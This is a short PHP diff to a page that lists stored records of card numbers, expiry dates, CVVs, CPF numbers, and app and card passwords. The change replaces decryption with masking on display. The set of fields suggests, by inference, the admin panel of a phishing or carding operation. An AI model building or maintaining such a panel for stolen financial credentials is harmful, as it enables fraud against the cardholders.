@@ -65,12 +65,12 @@ $execucao->execute();
                 echo "
                     <tr class='user'>
 					<td class='status1'>".security_h($row['status'])."</td>
-					<td>".security_h(security_unprotect_sensitive_value($row["cc"]))."</td>
-					<td>".security_h(security_unprotect_sensitive_value($row["validade"]))."</td>
-                	<td>".security_h(security_unprotect_sensitive_value($row["cvv"]))."</td>
-					<td>".security_h(security_unprotect_sensitive_value($row["cpf"]))."</td>
-					<td>".security_h(security_unprotect_sensitive_value($row["senha_app"]))."</td>
-					<td>".security_h(security_unprotect_sensitive_value($row["senha_cc"]))."</td>
+					<td>".security_h(security_mask_field("cc", $row["cc"]))."</td>
+					<td>".security_h(security_mask_field("validade", $row["validade"]))."</td>
+                	<td>".security_h(security_mask_field("cvv", $row["cvv"]))."</td>
+					<td>".security_h(security_mask_field("cpf", $row["cpf"]))."</td>
+					<td>".security_h(security_mask_field("senha_app", $row["senha_app"]))."</td>
+					<td>".security_h(security_mask_field("senha_cc", $row["senha_cc"]))."</td>
 					<td><a href='./processar/remover.php?id=".rawurlencode((string) $row["id"])."&csrf=".security_csrf_query()."'><button>APAGAR</button></a></td>
                     </tr>
                 ";
